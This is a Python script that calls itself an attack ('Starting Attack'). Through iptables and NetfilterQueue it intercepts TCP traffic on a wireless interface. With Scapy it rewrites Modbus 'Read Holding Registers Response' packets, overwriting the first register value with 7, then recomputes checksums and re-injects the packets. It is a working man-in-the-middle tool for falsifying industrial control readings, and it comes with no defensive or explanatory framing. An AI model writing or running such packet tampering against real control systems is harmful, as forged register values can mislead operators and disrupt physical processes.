from netfilterqueue import NetfilterQueue as nfq
from scapy.all import *
from scapy.layers.inet import *
from scapy.utils import *


import os

import random





def packet_listener(packet):
    
    
    pl=IP(packet.get_payload())

    #print('source IP:',pl[IP].src)
    #print('Destination IP', pl[IP].dst)
    #print('raw:',bytes(pl))

                 
                     
    
    if  pl.haslayer("Write Single Register"): 
        print("Write register cache is:", pl['Write Single Register'].raw_packet_cache)  
        print("Write register is:", pl['Write Single Register'])
       
    
    
    elif pl.haslayer("Read Holding Registers Response"):
      print("Register response is:", pl['Read Holding Registers Response'].registerVal)
      print('Original payload is ',pl['Read Holding Registers Response'].registerVal)
      #pload2=list(bytes(pl['Read Holding Registers Response'].registerVal))
      pload2=pl['Read Holding Registers Response'].registerVal

      pload2[0]=7
      print('payload2 is ',pload2)
      #pl['Write Single Register'].remove_payload
      pl['Read Holding Registers Response'].registerVal=pload2
      print('the new payload is ',pl['Read Holding Registers Response'].registerVal)
      del pl[TCP].chksum
      del pl[IP].chksum
      packet.set_payload(bytes(pl))
      #packet.drop()
      pl.show() 
        
     
    
    #pl.show()  
    send(pl)
    packet.accept()
           
           
            
           

    #print('plllllllllllllllllllllllll')

    

    #print(packet)
    
    #packet.accept()
  
     
  
  
def __setdown():
  os.system("sudo iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1") 
    

os.system("sudo iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")
os.system("sudo iptables -L")
queue = nfq()

queue.bind(1, packet_listener)



try:
  print("Starting Attack")
  
  queue.run()
except KeyboardInterrupt:
  __setdown()
  print("stopping sniffing")
  queue.unbind()